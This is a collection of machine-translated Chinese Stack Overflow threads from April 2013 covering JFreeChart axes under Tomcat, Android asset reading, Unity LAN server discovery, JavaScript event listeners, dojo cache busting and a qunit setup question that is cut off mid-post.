# StackOverflow 问答 16110000-16110999

# tomcat - JFreeChart 坐标轴因执行环境而异

> ID：16110000
> 
> 赞同：2
> 
> 时间：2013-04-19T17:09:19.737
> 
> 标签：tomcat, jfreechart, axis-labels

这有点奇怪。我有在 JFreeChart 中生成图表并将其保存为 .svg 文件的代码。如果我通过 Eclipse 中的测试方法运行代码，则输出如下：

![测试方法的图表](https://i.stack.imgur.com/Z2VlA.jpg)

注意漂亮的 LogAxis 标签。

现在，如果我在 Tomcat 的控制器中执行完全相同的代码，我会得到下图：

![从 Tomcat 创建的图形](https://i.stack.imgur.com/ciAwq.jpg)

请注意，虽然弧线相同，但第二张图像上的轴不再显示良好的对数级数。这不会打扰我，除了在第二种情况下，刻度线不仅没有显示好的对数，而且是错误的。

以下是生成图形的控制器代码。请注意，有些东西以一种不正常的方式硬连线 - 这是因为这是一个快速原型

```
 private static final String pn = "T495D477M004ATE100";

       private File generateMaxCurrentVoltageGraph()
             throws IOException, InitializationException, ClassNotFoundException
       {
          String title = "Current and Voltage - " + pn + " @ 25\u00B0C with 2 VDC Bias";
          String frequencyAxisLabel = "Frequency (Hz)";
          String valueAxisLabel1 = "Max Current (ARMS)";
          String valueAxisLabel2 = "Max Voltage (VRMS)";

          List datasets = createVoltageCurrentDatasets();
          JFreeChart chart = ChartFactory.createXYLineChart(title, frequencyAxisLabel, valueAxisLabel1, null, PlotOrientation.VERTICAL, true, false, false);
          chart.setBackgroundPaint(Color.white);

          final XYPlot plot = chart.getXYPlot();
          plot.setDataset(0, datasets.get(0));
          plot.setDataset(1, datasets.get(1));

          plot.setBackgroundPaint(Color.white);
          plot.setDomainGridlinePaint(Color.lightGray);
          plot.setRangeGridlinePaint(Color.lightGray);

          final XYLineAndShapeRenderer renderer1 = new XYLineAndShapeRenderer();
          renderer1.setSeriesShapesVisible(0, false);
          renderer1.setSeriesShapesVisible(1, false);
          renderer1.setSeriesPaint(0, Color.red);
          plot.setRenderer(0, renderer1);
          final XYLineAndShapeRenderer renderer2 = new XYLineAndShapeRenderer();
          renderer2.setSeriesShapesVisible(0, false);
          renderer2.setSeriesShapesVisible(1, false);
          renderer2.setSeriesPaint(0, Color.blue);
          plot.setRenderer(1, renderer2);

          final LogAxis rangeAxis1 = new LogAxis(valueAxisLabel1);
          rangeAxis1.setStandardTickUnits(LogAxis.createLogTickUnits(Locale.ENGLISH));
          rangeAxis1.setRange(0.1, 10.0); //100 mA to 10 A
          rangeAxis1.setNumberFormatOverride(new UnitNumberFormat(UnitValue.AMPS));
          rangeAxis1.setLabelPaint(Color.red);
          plot.setRangeAxis(0, rangeAxis1);

          final LogAxis rangeAxis2 = new LogAxis(valueAxisLabel2);
          rangeAxis2.setStandardTickUnits(LogAxis.createLogTickUnits(Locale.ENGLISH));
          rangeAxis2.setRange(0.01, 10.0); //10 mV to 10 V
          rangeAxis2.setNumberFormatOverride(new UnitNumberFormat(UnitValue.VOLTS));
          rangeAxis2.setLabelPaint(Color.blue);
          plot.setRangeAxis(1, rangeAxis2);
          plot.mapDatasetToRangeAxis(1, 1);

          final LogAxis domainAxis = new LogAxis(frequencyAxisLabel);
          domainAxis.setStandardTickUnits(LogAxis.createLogTickUnits(Locale.ENGLISH));
          domainAxis.setRange(100, 10000000); //100Hz to 10MHz
          domainAxis.setNumberFormatOverride(new UnitNumberFormat(UnitValue.HERTZ));
          plot.setDomainAxis(domainAxis);

          LegendTitle legendTitle = chart.getLegend();
          LegendTitle legendTitleNew = new LegendTitle(plot, new ColumnArrangement(), new ColumnArrangement());
          legendTitleNew.setPosition(legendTitle.getPosition());
          legendTitleNew.setBackgroundPaint(legendTitle.getBackgroundPaint());
          legendTitleNew.setBorder(0.25, 0.25, 0.25, 0.25);
          chart.removeLegend();
          chart.addLegend(legendTitleNew);

          chart.getTitle().setBackgroundPaint(Color.lightGray);
          chart.getTitle().setFont(rangeAxis1.getLabelFont());
          chart.getTitle().setExpandToFitSpace(true);
          chart.setPadding(new RectangleInsets(10, 10, 10, 10));

          File graphFile = File.createTempFile("CurrentVoltageGraph", ".svg");

          return writeGraphFile(chart, graphFile);
       }

       private List createVoltageCurrentDatasets()
             throws FileNotFoundException, IOException, InitializationException, ClassNotFoundException
       {
          List datasets = new ArrayList();
          XYSeriesCollection dataset1 = new XYSeriesCollection();
          XYSeriesCollection dataset2 = new XYSeriesCollection();
    //      String sourceDataPath = "/etc/intellidata/prototype/CurrentVoltageTestGraphData.csv";
          String sourceDataPath = "C:\\Users\\BrianTrezise\\Desktop\\Downloads\\CurrentVoltageTestGraphData.csv";
          CSVRowIterator csv = new CSVRowIterator(new FileInputStream(sourceDataPath));
          XYSeries series1 = new XYSeries("T495D477M004ATE100-I");
          XYSeries series2 = new XYSeries("T495D477M004ATE100-V");

          while(csv.hasNext())
          {
             Row row = csv.next();
             String frequencyString = (String) row.get("Frequency");
             String currentString = (String) row.get("Current");
             String voltageString = (String) row.get("Voltage");

             Double frequency = decodeValue(frequencyString);
             Double current = decodeValue(currentString);
             Double voltage = decodeValue(voltageString);

             series1.add(frequency, current);
             series2.add(frequency, voltage);
          }

          dataset1.addSeries(series1);
          datasets.add(dataset1);
          dataset2.addSeries(series2);
          datasets.add(dataset2);

          return datasets;
       }

       private File writeGraphFile(JFreeChart chart, File graphFile)
             throws IOException
       {
          // Get a DOMImplementation and create an XML document
          DOMImplementation domImpl = GenericDOMImplementation.getDOMImplementation();
          Document document = domImpl.createDocument(null, "svg", null);

          // Create an instance of the SVG Generator
          SVGGraphics2D svgGenerator = new SVGGraphics2D(document);
          svgGenerator.setSVGCanvasSize(new Dimension(720, 470));

          // draw the chart in the SVG generator
          Rectangle bounds = new Rectangle(10, 10, 700, 450);
          chart.draw(svgGenerator, bounds);

          // Write svg file
          OutputStream outputStream = new FileOutputStream(graphFile);
          Writer out = new OutputStreamWriter(outputStream, "UTF-8");
          svgGenerator.stream(out, true /* use css */);
          outputStream.flush();
          outputStream.close();

          return graphFile;
       } 

```

有没有人知道为什么它在 Tomcat 中的行为与直接从 Eclipse 中执行时的行为不同？注意：我还生成了第二个做同样事情的图表。从测试方法中可以正常工作，使用 Tomcat 控制器执行的相同代码在对数标记之间有奇怪的、不正确的刻度线。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T19:55:43.860

好吧，我仍然不知道为什么 tomcat 中的行为与 Eclipse 中的行为不同。也就是说，插入以下代码行（对于每个数据轴）似乎可以解决问题：

rangeAxis1.setAutoTickUnitSelection(false);

如果有人可以添加有关此的其他信息，但是我将不胜感激

# android - 以字符串形式读取资产文件

> ID：16110002
> 
> 赞同：66
> 
> 时间：2013-04-19T17:09:25.387
> 
> 标签：android, string

我想将位于资产中的文件的内容作为字符串读取。例如，位于`src/main/assets/`

**原始问题**
*我发现这个问题主要用作读取资产文件的“常见问题解答”，因此我总结了上面的问题。下面是我原来的问题*

我正在尝试将资产文件读取为字符串。我的资产文件夹中有一个文件：data.opml，并希望将其作为字符串读取。

我尝试过的一些事情：

```
 AssetFileDescriptor descriptor = getAssets().openFd("data.opml");
 FileReader reader = new FileReader(descriptor.getFileDescriptor()); 
```

并且：

```
 InputStream input = getAssets().open("data.opml");
 Reader reader = new InputStreamReader(input, "UTF-8"); 
```

但没有成功，所以一个完整的例子将不胜感激。

* * *

## 回答 #1

> 赞同：147
> 
> 时间：2013-04-19T17:11:27.573

`getAssets().open()`将返回一个`InputStream`. 使用标准 Java I/O 从中读取：

***Java：***

```
StringBuilder sb = new StringBuilder();
InputStream is = getAssets().open("book/contents.json");
BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8 ));
String str;
while ((str = br.readLine()) != null) {
    sb.append(str);
}
br.close(); 
```

***科特林：***

```
val str = assets.open("book/contents.json").bufferedReader().use { it.readText() } 
```

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2014-05-30T10:57:33.840

CommonsWare 的代码有一个小错误 - 换行符被丢弃并且不添加到字符串中。这是一些准备好复制+粘贴的固定代码：

```
private String loadAssetTextAsString(Context context, String name) {
        BufferedReader in = null;
        try {
            StringBuilder buf = new StringBuilder();
            InputStream is = context.getAssets().open(name);
            in = new BufferedReader(new InputStreamReader(is));

            String str;
            boolean isFirst = true;
            while ( (str = in.readLine()) != null ) {
                if (isFirst)
                    isFirst = false;
                else
                    buf.append('\n');
                buf.append(str);
            }
            return buf.toString();
        } catch (IOException e) {
            Log.e(TAG, "Error opening asset " + name);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    Log.e(TAG, "Error closing asset " + name);
                }
            }
        }

        return null;
    } 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-03-18T10:05:35.880

您也可以这样做，而无需使用循环。这很简单

```
AssetManager assetManager = getAssets();
InputStream input;
String text = "";

    try {
        input = assetManager.open("test.txt");

        int size = input.available();
        byte[] buffer = new byte[size];
        input.read(buffer);
        input.close();

        // byte buffer into a string
        text = new String(buffer);

    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    Log.v("TAG", "Text File: " + text); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2019-05-03T23:22:40.937

嗨，我认为这是最干净的方法：

 `````
 public static String loadTextFromAssets(Context context, String assetsPath, Charset charset) throws IOException {
        InputStream is = context.getResources().getAssets().open(assetsPath);
        byte[] buffer = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        for (int length = is.read(buffer); length != -1; length = is.read(buffer)) {
            baos.write(buffer, 0, length);
        }
        is.close();
        baos.close();
        return charset == null ? new String(baos.toByteArray()) : new String(baos.toByteArray(), charset);
    } 
````  `因为读者可能会遇到换行问题。``

# xcode - 将数据从 Viewcontroller 推送到 NavigationController，两者都在 tabbarcontroller 下

> ID：16110003
> 
> 赞同：1
> 
> 时间：2013-04-19T17:09:26.580
> 
> 标签：xcode, uinavigationcontroller, viewcontroller, tabbarcontroller

我正在创建一个具有 tabbarcontroller、导航控制器和 viewcontroller 故事板的应用程序是这样的

## 标签栏控制器

*   1个视图控制器（ScanViewController）
*   2 NavigationController1 - UITableviewController (SalesOrder)
*   3 NavigationController2 - UITableviewController
*   4 导航控制器3

现在，我可以通过这样的代码将一些数据从 navigationcontroller1 的 rootviewcontroller 传递到视图控制器

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];
    ScanViewController *svc =[self.tabBarController.viewControllers objectAtIndex:0];
    svc.company_name.text= cell.textLabel.text;
    self.tabBarController.selectedIndex = 0;

} 
```

但是，我不能像这样将数据从 viewController 传递到 navigationcontroller 的任何 rootviewcontroller 我的代码

```
-(IBAction)button_order{
    SalesOrder *so =[self.tabBarController.viewControllers objectAtIndex:1];
    so.sales_order_list_from_scan = [[NSMutableArray alloc] initWithObjects:@"SO 4",@"SO 5",nil];
    self.tabBarController.selectedIndex = 1;
} 
```

你能告诉我这里有什么问题吗？我检查了自己，似乎 SalesOrder(UITableview, RootViewController of NavigationController1) 所以没有初始化。如果我在 SalesOrder.m 中添加项目，它可以工作，所以我不认为这是任何委托问题。问题出在哪里

```
[self.tabBarController.viewControllers objectAtIndex:1]; 
```

谢谢你

# python - python中的模型绑定-自动将http post请求中传递的参数转换为类的字段

> ID：16110012
> 
> 赞同：0
> 
> 时间：2013-04-19T17:09:42.127
> 
> 标签：python, google-app-engine, webapp2

你知道有什么方法可以安全、自动地将在 http post 请求中传递的参数转换为类的字段吗？我没有使用 django，我正在使用 webapp2

我通过以下方式实现了这个功能：显然，对于一个非常小的应用程序来说，这是一种天真的方式。对于更可靠的系统的建议将不胜感激。

我创建了一个字典列表，其中存储了有关我要为其构建的字段的信息

```
form_fields = [{'placeholder': 'First Name',
           'attribute_name': 'first_name',
           'icon': 'icon-user',
           'has_errors': lambda x: "Name required" if len(x) <= 2 or x == "Name" else None },...] 
```

在同一个字典中，我存储了表单模板所需的其他信息以及我调用来验证输入的函数

在 post(self): handler 我正在做这样的事情：

```
 errors = []
        my_model = MyModel()
        for field in form_fields:
            value = self.request.get(field['attribute_name'])
            setattr(my_model, field['attribute_name'], value)
            error = field['has_errors'](value)
            if error: errors.append(error)

        if len(errors) == 0:           
            my_model.put()
            self.redirect('/somewhere')
        else:
            template = jinja_environment.get_template('template.html')
            context = {
                'form_fields': form_fields,
                'my_model': my_model,
                'errors': errors
            }
            self.response.write(template.render(context)) 
```

观点很简单：

```
 <ul class="errors">
            {% for error in errors %}
            <li>{{error}}</li>
            {% endfor %}
        </ul>
<form method="post">
<fieldset>
{% for element in form_fields %}
<i class="{{element.icon}}"></i>
<input type="text" name="{{element.attribute_name}}" onfocus="if(this.value == '{{element.placeholder}}') { this.value = ''; }" onblur="if(this.value == '') { this.value = '{{element.placeholder}}'; }" 
       value="{{my_model[element.attribute_name] if my_model is defined else element.placeholder}}" />
{% endfor %}

<div class="clear">
    <button id="submit" type="submit">OK <i class="icon-caret-right buttonArrow"></i></button>
</div> 
```

显然，对于一个非常小的应用程序来说，这是一种幼稚的方式。对更坚实的系统的建议将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:18:30.837

也许内置函数`setattr`可以帮助你：

```
class X(object):
    pass

x = X()
setattr(x, 'a', 2)
print x.a  # returns 2 
```

[setattr](http://docs.python.org/2/library/functions.html?highlight=setattr#setattr)的文档。

# python - Python如何消除3个或更多后续字母

> ID：16110013
> 
> 赞同：0
> 
> 时间：2013-04-19T17:09:43.053
> 
> 标签：python

我正在尝试将那些连续字母超过 3 个的单词替换为真的。

```
pattern = re.compile(r"(.)\1\1{2,}", re.DOTALL)
return pattern.sub(r"\1\1\1", text) 
```

我不能让它工作有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:20:53.253

您的解决方案实际上似乎工作正常：

```
>>> import re
>>> a = 'foooooooo baaaar'
>>> reg = re.compile( r"(.)\1\1{2,}")
>>> reg.sub(r'\1\1', a)
'foo baar' 
```

但是根据评论，您想替换`xyyyx`为`xyyx`，但您已经为其中至少 4 个指定了正则表达式，因此只会`xyyyyx`被替换...只需更改此行：

```
>>> reg = re.compile( r"(.)\1{2,}")
>>> reg.sub(r'\1\1', 'fooo baaaar actuallly')
'foo baar actually' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:34:31.253

我建议在不需要时不要使用正则表达式。这个任务可以很容易地完成，以一种更易读的方式，具有线性时间和恒定空间复杂度（不确定正则表达式）。

```
def filter_repetitions(text, max_repetitions=0):
    last_character = None
    repetition_count = 0
    for character in text:
        if character == last_character:
            repetition_count += 1
        else:
            last_character = character
            repetition_count = 0
        if repetition_count <= max_repetitions:
            yield character

print ''.join(filter_repetitions("fooo baaaar actuallly", 1)) 
```

# client-server - Unity3d 服务器自动发现，仅限 LAN

> ID：16110014
> 
> 赞同：5
> 
> 时间：2013-04-19T17:09:45.657
> 
> 标签：client-server, unity3d

我需要用本地网络中的服务器实现游戏，*无法访问 Internet*。

假设我可以处理客户端和服务器之间的连接和网络通信（如果它们已连接），我想知道是否有一种优雅的方法可以让客户端在启动时发现服务器的地址。

* * *

我提供我的方法作为答案，以分享知识，但很高兴看看是否有更优雅/自动的方法。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T17:09:45.657

客户端将使用特定端口连接到游戏服务器。我在不同的端口实现了 UDP 多播，因此客户端可以获得服务器的 IP。

以下代码适用于服务器和客户端，用 Unity Javascript 编写。在**服务器**端，它将开始每秒在端口 5100 发送多播消息。**客户端**将侦听同一端口，直到它们检测到新消息。然后他们识别发件人的 IP 并以 Unity3d 的方式建立客户端-服务器连接。

```
private var server_port : int = 5000;
private var server_ip : String;

// multicast
private var startup_port : int = 5100;
private var group_address : IPAddress = IPAddress.Parse ("224.0.0.224");
private var udp_client : UdpClient;
private var remote_end : IPEndPoint;

function Start ()
{
    // loaded elsewhere
    if (station_id == "GameServer")
        StartGameServer ();
    else
        StartGameClient ();
}

function StartGameServer ()
{
    // the Unity3d way to become a server
    init_status = Network.InitializeServer (10, server_port, false);
    Debug.Log ("status: " + init_status);

    StartBroadcast ();
}

function StartGameClient ()
{
    // multicast receive setup
    remote_end = IPEndPoint (IPAddress.Any, startup_port);
    udp_client = UdpClient (remote_end);
    udp_client.JoinMulticastGroup (group_address);

    // async callback for multicast
    udp_client.BeginReceive (new AsyncCallback (ServerLookup), null);

    MakeConnection ();
}

function MakeConnection ()
{
    // continues after we get server's address
    while (!server_ip)
        yield;

    while (Network.peerType == NetworkPeerType.Disconnected)
    {
        Debug.Log ("connecting: " + server_ip +":"+ server_port);

        // the Unity3d way to connect to a server
        var error : NetworkConnectionError;
        error = Network.Connect (server_ip, server_port);

        Debug.Log ("status: " + error);
        yield WaitForSeconds (1);
    }
}

/******* broadcast functions *******/
function ServerLookup (ar : IAsyncResult)
{
    // receivers package and identifies IP
    var receiveBytes = udp_client.EndReceive (ar, remote_end);

    server_ip = remote_end.Address.ToString ();
    Debug.Log ("Server: " + server_ip);
}

function StartBroadcast ()
{
    // multicast send setup
    udp_client = UdpClient ();
    udp_client.JoinMulticastGroup (group_address);
    remote_end = IPEndPoint (group_address, startup_port);

    // sends multicast
    while (true)
    {
        var buffer = Encoding.ASCII.GetBytes ("GameServer");
        udp_client.Send (buffer, buffer.Length, remote_end);

        yield WaitForSeconds (1);
    }
} 
```

将此附加到您的`GameObject`应该可以解决问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-03-06T10:10:39.353

这是ac#版本谢谢

```
using System.Collections;
using UnityEngine;
using System.Net.Sockets;
using System;
using System.Net;
using System.Text;

public class OwnNetworkManager : MonoBehaviour
{

private int server_port = 5000;
private string server_ip;

// multicast
private int startup_port = 5100;
private IPAddress group_address = IPAddress.Parse("127.0.0.1");
private UdpClient udp_client ;
private IPEndPoint remote_end ;

void Start()
{
    // loaded elsewhere
    if (Loader.IsPC)
        StartGameServer();
    else
        StartGameClient();
}

void StartGameServer()
{
    // the Unity3d way to become a server
    NetworkConnectionError init_status = Network.InitializeServer(10, 
server_port, false);
    Debug.Log("status: " + init_status);

    StartCoroutine(StartBroadcast());
}

void StartGameClient()
{
    // multicast receive setup
    remote_end = new IPEndPoint(IPAddress.Any, startup_port);
    udp_client = new UdpClient(remote_end);
    udp_client.JoinMulticastGroup(group_address);

    // async callback for multicast
    udp_client.BeginReceive(new AsyncCallback(ServerLookup), null);

    StartCoroutine(MakeConnection());
}

IEnumerator MakeConnection()
{
    // continues after we get server's address
    while (string.IsNullOrEmpty(server_ip))
        yield return null;

    while (Network.peerType == NetworkPeerType.Disconnected)
    {
        Debug.Log("connecting: " + server_ip + ":" + server_port);

        // the Unity3d way to connect to a server
        NetworkConnectionError error ;
        error = Network.Connect(server_ip, server_port);
        Debug.Log("status: " + error);
        yield return new WaitForSeconds (1);
    }
}

/******* broadcast functions *******/
void ServerLookup(IAsyncResult ar)
{
    // receivers package and identifies IP
    var receiveBytes = udp_client.EndReceive(ar, ref remote_end);

    server_ip = remote_end.Address.ToString();
    Debug.Log("Server: " + server_ip);
}

IEnumerator StartBroadcast()
{
    // multicast send setup
    udp_client = new UdpClient();
    udp_client.JoinMulticastGroup(group_address);
    remote_end = new IPEndPoint(group_address, startup_port);

    // sends multicast
    while (true)
    {
        var buffer = Encoding.ASCII.GetBytes("GameServer");
        udp_client.Send(buffer, buffer.Length, remote_end);

        yield return new WaitForSeconds (1);
    }
}
} 
```

# javascript - 无法使用 addEventListener 注册 onclick

> ID：16110016
> 
> 赞同：2
> 
> 时间：2013-04-19T17:09:50.617
> 
> 标签：javascript

我只是想注册`onclick`，`div`但它不起作用。相反，`alert`加载页面时会触发 cal to。

```
function print()
{
    alert(' div clicked..');
}

var divElement = document.getElementById("content");
divElement.addEventListener("onclick", print()); 
```

这是一个[jsFiddle](http://jsfiddle.net/sukumar/SwrVg/1/)。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T17:11:23.290

问题是您不需要*前缀*`on`。并且**不**`print`应该有空括号。空括号将导致函数执行，并将其返回值*作为要调用的****函数***传递- 这*不是*您想要的。

 *****尝试这个：

```
var divElement = document.getElementById("content");
divElement.addEventListener("click", print); 
```

这是一个[更新的工作 jsFiddle](http://jsfiddle.net/SwrVg/3/)。

* * *

**编辑：**根据[Ian 在](https://stackoverflow.com/questions/16110016/unable-to-register-onclick-with-addeventlistener/16110043#comment23005966_16110043)下面的评论，这里有一个帮助函数，用于向后兼容特定版本的 Internet Explorer。

```
function AttachEventListener(element, event, handler) {
    if (element.addEventListener) {
        element.addEventListener(event, handler, false);
    } else if (element.attachEvent) {
        element.attachEvent('on' + event, handler);
    } else {
        alert('Invalid element specified for AttachEventListener');
    }
} 
```

而不是使用`divElement.addEventListener("click", print)`，你会做`AttachEventListener(divElement, 'click', print)`。

使用帮助函数的*主要原因*是因为旧版本的 Internet Explorer*没有*，`addEventListener`并且在使用时**确实**需要`on`前缀`attachEvent`。这个辅助函数将省去您在每个事件绑定上自己进行功能检查的麻烦。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-19T17:10:37.460

你应该这样写：

```
divElement.addEventListener("click", print); 
```

`print`是一个指向你的函数的变量。

`print()`是该函数的*输出*。（它没有输出，所以它是`undefined`）

由于您要分配功能而不是输出，因此您必须使用`print`.

此外，您不需要`on`前缀。

Presto：http: [//jsfiddle.net/AEjKC/](http://jsfiddle.net/AEjKC/)*****

# gwt - ensureDebugId() 真的会影响性能吗？

> ID：16110017
> 
> 赞同：0
> 
> 时间：2013-04-19T17:09:50.967
> 
> 标签：gwt

在尝试设置我们的 web 应用程序（用 GWT 编写）以进行自动化测试时，我已经阅读/听说使用 ensureDebugId() 设置元素 ID 会导致应用程序性能受到影响。当然，设置元素属性会对最终应用程序造成*小*的性能影响，但 ensureDebugId() 真的会导致性能上的显着差异吗？除了设置元素 id 之外，它还做其他事情吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:54:23.930

1.  它不会对我们的 100+ 屏幕应用程序造成任何明显的性能影响。

2.  在编写代码之前不要对应用程序进行微优化。

3.  打开`ensureDebugId`并分析您的应用程序。

4.  关闭`ensureDebugId`并分析您的应用程序。

**如果您确实发现它在无法容忍的范围内影响性能，请拨打电话。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:34:16.577

`ensureDebugId`如果您在 UI 中渲染大量元素，只会导致性能问题，但我认为它们不会引起注意。如果您有这样的 UI，您可能会注意到由于其他原因导致的性能问题。

无论如何，您从应用程序中删除的任何不需要的东西都会改进您的应用程序。

我`ensureDebugId`只会为测试环境启用，因此您可以使用不同的编译配置文件来使用 jenkins 或您正在使用的任何持续集成软件来测试您的应用程序，并使用另一个配置文件来生产您的可交付产品。

如果您还没有阅读，gwt 列表中的这个[线程可能会很有用。](https://groups.google.com/group/google-web-toolkit/browse_thread/thread/8d5b654e99b4c1aa)

# ios - iPhone App 中异步（非阻塞）显示警报

> ID：16110019
> 
> 赞同：-2
> 
> 时间：2013-04-19T17:09:53.003
> 
> 标签：ios, objective-c, web-services, asynchronous

在我的 iPad 应用程序中，正在连接到 Web 服务。在连接到它的同时，我在标签中向用户显示进度活动指示器和相应的消息（标签在子视图中，并且正在将子视图添加到当前视图）。

在这行代码（调用方法将子视图添加到视图）之后，我正在调用该方法来调用 Web 服务。但是，首先执行 Web 服务调用，然后只显示用户信息子视图。

有什么办法可以说我想“继续显示”警报视图，即使执行继续到下一行代码？

```
// Calling method to add info/alert subview to current view [self displayUserMessage]; 
// Connect to Web Service [self connectToWebService]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:45:01.433

我不确定我是否完全理解你的问题。如果您在解释后提供一些代码，也更容易理解......无论如何，我理解的是您正在连接到网络服务并在连接进行时显示一些信息？

请记住，如果您不想挂起您的用户界面，您需要在另一个线程中发送 webService Connection，这样您就可以保持主线程空闲。您可以使用 GCD 执行此操作。

```
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
    [self connectWithWebService];
}); 
```

然后根据 Web 服务的架构，您可以使用委托或完成块向用户显示一些消息（信息/警报）。在这种情况下，请记住与 UI 相关的任何内容都应该在主线程上运行。所以正如我之前所说，根据你的架构，你应该做这样的事情

```
dispatch_async(dispatch_get_main_queue(), ^{
    // Show UI Changes
}); 
```

当 webService 方法在后台运行时，UI 应该正确更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:49:44.093

`NSURLConnection`如果您想要异步连接，使用's更容易`sendAsynchronousRequest:queue:completionHandler:`。

您可以在调用它之前显示您的警报并在完成处理程序中将其关闭。

# dojo - 是否可以通过 dojo 的 AMD 加载器向 dojo 模块请求添加请求参数

> ID：16110024
> 
> 赞同：5
> 
> 时间：2013-04-19T17:10:13.423
> 
> 标签：dojo

在将请求发送到服务器以获取 AMD 模块之前，是否可以修改 dojo AMD 加载程序使用的请求 url？我想附加一个带有版本号的请求参数。

我们试图解决的问题是我们希望浏览器缓存我们的 javascript 文件，除非应用程序的版本被更新。我认为如果我们可以在请求的 URL 中添加版本号，我们应该能够做到这一点。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-19T17:31:02.570

`paths`config 属性似乎适用于单个模块，并且可`cacheBust`用于所有模块。[示例 jsfiddle](http://jsfiddle.net/R6Bxq/4/)。

```
<script>
var dojoConfig = {
    paths: {
        // version a single file by using path with version number
        "aa": "mylib-aa.js?v=1.0",
        // standard path, no explicit versioning
        "bb": "mylib-bb"
    },
    // use v=1.0 for ALL loaded modules
    cacheBust: "v=1.0",
    waitSeconds: 10
};
</script>
<script src="https://ajax.googleapis.com/ajax/libs/dojo/1.8.3/dojo/dojo.js"></script>
<script>
require(["aa", "bb"], function () {});
</script> 
```

给予：

```
"NetworkError: 404 Not Found - https://ajax.googleapis.com/ajax/libs/dojo/1.8.3/dojo/mylib-aa.js?v=1.0.js&v=1.0"
"NetworkError: 404 Not Found - https://ajax.googleapis.com/ajax/libs/dojo/1.8.3/dojo/mylib-bb.js?v=1.0" 
```

该`paths`方法的问题是尾随的“.js”，但出于版本控制的目的，我认为这不是问题，因为 URL 在您希望的方式中仍然是唯一的。

# python - 仅使用 for 循环遍历文件是否是一种好的形式？

> ID：16110025
> 
> 赞同：3
> 
> 时间：2013-04-19T17:10:13.223
> 
> 标签：python, file-io, with-statement, contextmanager

我遇到了一些遍历文件中行的代码，如下所示：

```
for line in open(filename, 'r'):
    do_all_the_things() 
```

这是一个更 Pythonic 的版本，例如：

```
with open(filename, 'r') as f:
    for line in f:
        do_all_the_things() 
```

它使用更少的缩进级别，所以看起来更好，但它是一样的吗？据我所知，`with`基本上添加了一个`finally: f.close()`或一些东西来确保在离开块后清理对象。当第一个`for`循环结束（或者被 a 缩短`break`）并且变量超出范围时，是否会发生同样的事情？我可以从第一段代码中得到提示并为自己节省一些击键，或者更确切地说，我应该修复它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:14:58.977

除了在 for 循环使用的迭代器中，您没有创建对文件对象的任何引用。

这意味着一旦 for 循环结束，该迭代器，然后是文件对象，它们的引用计数将归零，并且它们将被删除。

当一个文件对象被删除时，它会被关闭。

因此，您不会使用裸`for`循环留下打开的文件。

也就是说，在一个更大的程序中，最好是明确的——并且`with`声明清楚地表明该文件仅在该上下文中使用。

就个人而言，如果我打开一个文件进行写入/追加，那么`with`即使我只在一个地方使用它，我也会使用它。如果我只是打开它进行阅读而不是创建显式引用，我只是直接使用该对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:22:42.933

绝对使用上下文管理器。这是**保证**您的文件对象得到正确处理的唯一方法。

虽然第一个版本可能不会在 Cpython 中（当前）给您带来任何问题，但该规范从未指定何时（或什至*是否*）`__del__`被调用。因此，您无法确定您的文件对象是否会使用第一个版本正确完成。

# javascript - qunit 和 jquery 未捕获的异常

> ID：16110027
> 
> 赞同：2
> 
> 时间：2013-04-19T17:10:15.707
> 
> 标签：javascript, jquery, node.js, unit-testing, qunit

我在尝试使用 qunit 让 javascript 单元测试在命令行上工作时遇到问题。

这是一些重现错误的示例代码：

文件**util.js**：

```
function abc() {
    return 'abc';
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        abc: abc
    };
} 
```

文件**util-tests.js**

```
var qunit = require("qunit");

test("Test abc function", function () {
         equal(util.abc(), 'abc');
}); 
```

使用这些文件，我可以使用以下命令运行测试（在 shell 中提供类似表格的输出以及测试结果）：

```
qunit -c util:util.js -t util-tests.js 
```

现在，如果我将以下内容添加到 util.js，它会中断

```
$(document).ready(function () {
    /* some code here */
}); 
```

这是错误输出：

```
qunit -c util:util.js -t util-tests.js

Testing /home/mfrere/jstst/util.js ... [Error: Uncaught exception in child process.] 
```

同样的问题：

```
var a = $; 
```

或者：

```
var a = document; 
```

所以这让我觉得我需要以某种方式导入 jQuery，所以我考虑将 jquery.js 添加为命令的依赖项，如下所示：

```
qunit -c util:util.js -t util-tests.js -d jquery.js 
```

上面的命令给了我同样的“未捕获异常”错误，即使 util.js 不包含对“$”的任何引用。

我可能需要做其他事情才能让 qunit 也识别“文档”，但我不知道是什么或如何。

现在这是我的问题：*我应该怎么做才能让它发挥作用？*重要的是要记住我想在命令行中测试我的文件，而不是在浏览器中。

以防万一我在设置过程中做错了什么，这就是我安装 node/qunit 的方式（在 ubuntu 下）：

```
git clone git://github.com/creationix/nvm.git ~/.nvm 
```

在 .bashrc 中，我添加了以下行：

```
source ~/.nvm/nvm.sh 
```

选择了特定版本的节点

```
nvm install v0.9.2
